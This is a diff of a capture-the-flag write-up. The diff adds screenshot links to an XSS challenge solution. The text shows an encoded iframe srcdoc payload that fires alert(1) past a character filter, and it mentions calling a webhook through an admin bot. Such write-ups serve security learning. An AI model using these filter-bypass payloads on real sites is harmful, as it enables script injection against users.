@@ -90,6 +90,8 @@ I replaced s with S and l with L
 
 But if we want to insert the webhook it will contain a lot of things that blocked but we can use encoding since we have `${banned[0]}` as `&` we can use html encoding for instance `${banned[0]}#x3d` get converted to `=` 
 
+
+
 Let's make a script that will help us convert everything 
 <br />
 
@@ -108,6 +110,10 @@ will gave us this
 ```
 ${banned[0]}#x3c${banned[0]}#x69${banned[0]}#x6d${banned[0]}#x67${banned[0]}#x2f${banned[0]}#x73${banned[0]}#x72${banned[0]}#x63${banned[0]}#x3d${banned[0]}#x78${banned[0]}#x20${banned[0]}#x6f${banned[0]}#x6e${banned[0]}#x65${banned[0]}#x72${banned[0]}#x72${banned[0]}#x6f${banned[0]}#x72${banned[0]}#x3d${banned[0]}#x61${banned[0]}#x6c${banned[0]}#x65${banned[0]}#x72${banned[0]}#x74${banned[0]}#x28${banned[0]}#x31${banned[0]}#x29${banned[0]}#x3e
 ```
+
+<br />
+<img/src="https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/9.png">
+<br />
 
 But when we try it it's rendered as text we can use iframe to load it as html
 
@@ -132,7 +138,7 @@ This is the payload to get alert(1)
 ${banned[1]}iframe Srcdoc='${banned[0]}#x3c${banned[0]}#x69${banned[0]}#x6d${banned[0]}#x67${banned[0]}#x20${banned[0]}#x53${banned[0]}#x52${banned[0]}#x43${banned[0]}#x3d${banned[0]}#x78${banned[0]}#x20${banned[0]}#x6f${banned[0]}#x6e${banned[0]}#x65${banned[0]}#x72${banned[0]}#x72${banned[0]}#x6f${banned[0]}#x72${banned[0]}#x3d${banned[0]}#x22${banned[0]}#x61${banned[0]}#x6c${banned[0]}#x65${banned[0]}#x72${banned[0]}#x74${banned[0]}#x28${banned[0]}#x31${banned[0]}#x29${banned[0]}#x22${banned[0]}#x3e' ${banned[1]}/iframe${banned[2]}
 ```
 
-<img>
+<img/src="https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/4.png">
 
 Let's try call our webhook:
 
@@ -150,18 +156,19 @@ payload = f"{nd}iframe Srcdoc='{hex_encoded}' {nd}/iframe{td}"
 
 print("\n[+] Final Payload:\n", payload)
 ```
-
-<img>
+<br />
 
 Got a callback, Let's report to the bot:
 
-<img>
+<img/src="https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/5.png">
 
 We didn't get callback, looking at the bot, Found this option that will disable image loading:
+<br />
 
 ```py
 chrome_opts.add_argument("--blink-settings=imagesEnabled=false")
 ```
+
 Let's try another payload that doesn't contain an image
 
 ```py
@@ -180,5 +187,8 @@ print("\n[+] Final Payload:\n", payload)
 ```
 
 Got it:
+<br/>
+<img/src="https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/7.png">
+<br />
 
-<img>
+<img/src="https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/8.png">
